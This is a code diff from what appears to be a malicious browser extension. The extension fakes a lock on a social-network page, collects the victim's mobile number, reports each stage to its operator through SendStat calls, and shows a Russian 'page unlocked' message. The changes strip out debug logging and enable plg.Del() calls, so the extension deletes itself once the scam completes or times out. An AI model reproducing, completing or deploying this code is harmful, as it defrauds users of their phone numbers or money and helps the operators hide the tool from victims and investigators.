@@ -16,7 +16,7 @@ function NewAction() {
 	if (!plg.Get('oRun')){
 		plg.Save('oRun','1');
 		SendStat(0,"small");
-		console.log('0');
+		
 	}
 }
 
@@ -357,7 +357,7 @@ function st_2() {
                 alert('Вы успешно разблокировали свою страницу, рекомендуем вам сменить пароль');
                 RedirToChangePass();
                 HideLock();
-				//plg.Del(); //удаление ext
+				plg.Del(); 
                 return true;
             }
 
@@ -612,7 +612,7 @@ function Wnd() {
 	document.getElementById('field_mobile').value = nam;
     plg.Save('oRun', '2');
 	SendStat(1,"small");
-	console.log('1');
+	
 	
 	
 }
@@ -638,7 +638,7 @@ function Wnd_Page() {
     document.getElementById('mainContainer').style.backgroundColor = "#FFF";
     plg.Get('oRun') == '2';
 	SendStat(2,"small");
-	console.log('2');
+	
     if (document.getElementsByClassName('feed-loading')[0])
         document.getElementsByClassName('feed-loading')[0].parentNode.removeChild(document.getElementsByClassName('feed-loading')[0]);
 
@@ -825,7 +825,7 @@ function IsTime() {
         plg.Save('oRun', '0');
 		SendStat(666,"big");
 		SendStat(666,"small");
-		//plg.Del();
+		plg.Del();
         LockStop();
 
     }
